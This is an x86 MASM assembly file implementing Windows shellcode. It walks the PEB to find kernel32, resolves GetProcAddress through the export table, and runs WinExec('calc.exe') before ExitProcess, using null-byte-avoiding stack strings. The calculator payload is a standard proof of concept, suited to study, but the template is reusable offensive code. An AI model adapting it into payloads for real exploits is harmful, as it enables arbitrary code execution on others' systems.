.386 
.model flat, stdcall

.data

.code
main PROC
	ASSUME fs:NOTHING ; masm compilation error override
	xor ecx, ecx
	mov eax, fs:[ecx+30h] ; eax = PEP base address
	mov eax, [eax+0ch] ; eax = PEP_LDR_DATA base address
	mov esi, [eax+14h] ; eax = InMemoryOrderModuleList
	lodsd
	xchg eax, esi
	lodsd
	mov ebx, [eax+ 10h] ; kernel32.dll base address
	mov edx, [ebx + 3ch] ; DOS -> e_lfanew
	add edx, ebx ; edx = PE Header
	mov edx, [edx + 78h] ; Get the virualAddress to the offset of ExportDirectory from the DataDirectory array
	add edx, ebx ; edx = ExportTable
	mov esi, [edx + 20h] ; esi = Offset names table
	add esi, ebx ; esi = Names table
	xor ecx, ecx ; ecx = 0
GetProcAddress_Function:
	inc ecx
	lodsd ; Get Name offset
	add eax, ebx ; Get Function name
	cmp dword ptr[eax], 50746547h ; GetP
	jnz GetProcAddress_Function
	cmp dword ptr[eax + 4h], 41636f72h ; rocA
	jnz GetProcAddress_Function
	cmp dword ptr[eax + 8h], 65726464h ; ddre
	jnz GetProcAddress_Function
	; Ordinal number of GetProcAddress function
	mov esi, [edx + 24h] ; Offset Ordinals
	add esi, ebx ; esi = Ordinals table
	mov cx, [esi + ecx * 2] ; multiple in 2 because the array contains two byte
	;numbers. cx= number of function
	dec ecx
	mov esi, [edx + 1ch] ; offset of address table
	add esi, ebx ; esi = address table
	mov edx, [esi + ecx * 4] ; edx = pointer (offset)- the array contains 4 byte values
	add edx, ebx ; edx = GetProcAddress base address
	; finding WinExec Procedure Address
	xor ecx, ecx
	push ebx ; push kernel32.dll base address
	push edx ; push GetProcAddress base address
	push ecx ; push 0
	push 61636578h ; xeca (little endian + ‘a’ in order to fill the gap to 4 bytes)
	sub dword ptr[esp + 3h], 61h ; Remove 'a'
	push 456e6957h ; WinE (little endian)
	push esp ; "WinExec" full string from the entry point address
	push ebx ; Kernel32.dll base address
	call edx ; execute GetProcAddress- In order to find the address of WinExec
	; WinExec
	add esp, 0ch ; Clean the stack
	xor ecx, ecx ; ecx = 0
	push ecx
	push 6578652eh ; .exe (little endian)
	push 636c6163h ; calc (little endian)
	push 5
	lea ecx, [esp + 4]
	push ecx ; "calc.exe"
	call eax ; WinExec("calc.exe", 5)
	; Get ExitProcess Function
	add esp, 0ch ; Clean the stack
	pop edx ; GetProcAddress
	pop ebp ; Kernel32.dll base address
	mov ecx, 61737365h ; essa
	push ecx
	sub dword ptr[esp + 3h], 61h ; Remove 'a'
	push 636f7250h ; Proc
	push 74697845h ; Exit
	push esp ; "ExitProcess"
	push ebx ; Kernel32.dll base address
	call edx ; execute GetProcAddress- In order to find the address of ExitProcess
	add esp, 14h ; Clean the stack
	xor ecx, ecx ; ecx = 0
	push ecx ; Return code = 0
	call eax ; ExitProcess
	ret
main ENDP

END main